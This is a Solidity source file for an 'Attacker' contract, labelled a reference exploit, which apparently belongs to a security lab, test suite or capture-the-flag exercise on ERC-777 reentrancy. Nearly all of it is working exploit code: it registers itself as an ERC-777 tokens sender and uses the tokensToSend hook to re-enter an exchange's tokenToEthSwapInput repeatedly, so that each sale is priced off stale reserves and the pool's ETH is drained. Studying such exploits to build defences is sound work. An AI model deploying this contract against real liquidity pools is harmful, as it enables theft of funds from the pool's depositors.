// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC777} from "@erc777/contracts/token/ERC777/IERC777.sol";
import {IERC777Sender} from "@erc777/contracts/token/ERC777/IERC777Sender.sol";
import {IERC20} from "@erc777/contracts/token/ERC20/IERC20.sol";
import {IERC1820Registry} from "@erc777/contracts/utils/introspection/IERC1820Registry.sol";

interface IExchange {
    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline)
        external
        returns (uint256);
}

/// @title Attacker
/// @notice Reference exploit contract. It registers itself as an
///         `ERC777TokensSender` with the ERC-1820 registry and approves the
///         pool for an infinite allowance. `attack` sells a chunk of tokens to
///         the pool; the ERC-777 `tokensToSend` hook — which the token fires
///         _before_ updating any balance — re-enters `tokenToEthSwapInput`
///         up to `maxDepth` times. Every reentrant sell is priced off the same
///         stale pool reserve, so the attacker extracts ETH at the favourable
///         marginal price and drains the pool far beyond what a single,
///         non-reentrant sell could achieve.
contract Attacker is IERC777Sender {
    IERC777 public immutable token;
    IExchange public immutable pool;
    IERC1820Registry public immutable registry;

    bytes32 private constant TOKENS_SEND_HASH = keccak256("ERC777TokensSender");

    uint256 public chunkSize;
    uint256 public maxDepth;
    uint256 public depth;
    uint256 public totalEthBought;

    constructor(address token_, address pool_, address registry_) {
        token = IERC777(token_);
        pool = IExchange(pool_);
        registry = IERC1820Registry(registry_);

        // Register this contract as the ERC777TokensSender implementer for
        // itself. The registry allows an account to set its own implementer
        // (implementer == caller skips the canImplementInterfaceForAddress
        // check), so no extra magic is required.
        registry.setInterfaceImplementer(address(this), TOKENS_SEND_HASH, address(this));

        // The pool pulls tokens via transferFrom; grant it an infinite
        // allowance so every reentrant sell is allowed without decrement.
        IERC20(address(token)).approve(pool_, type(uint256).max);
    }

    /// @notice Kick off the reentrant drain. The attacker contract must already
    ///         hold `(maxDepth_ + 1) * chunkSize_` tokens.
    function attack(uint256 chunkSize_, uint256 maxDepth_) external {
        chunkSize = chunkSize_;
        maxDepth = maxDepth_;
        depth = 0;
        totalEthBought = 0;
        uint256 bought = pool.tokenToEthSwapInput(chunkSize_, 0, type(uint256).max);
        totalEthBought += bought;
    }

    /// @inheritdoc IERC777Sender
    /// @dev Called by the ERC-777 token _before_ state is updated. Re-enter the
    ///      pool while its reserves are still stale.
    function tokensToSend(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        require(msg.sender == address(token), "Attacker: only token");
        if (depth < maxDepth) {
            depth += 1;
            uint256 bought = pool.tokenToEthSwapInput(chunkSize, 0, type(uint256).max);
            totalEthBought += bought;
        }
    }

    receive() external payable {}
}
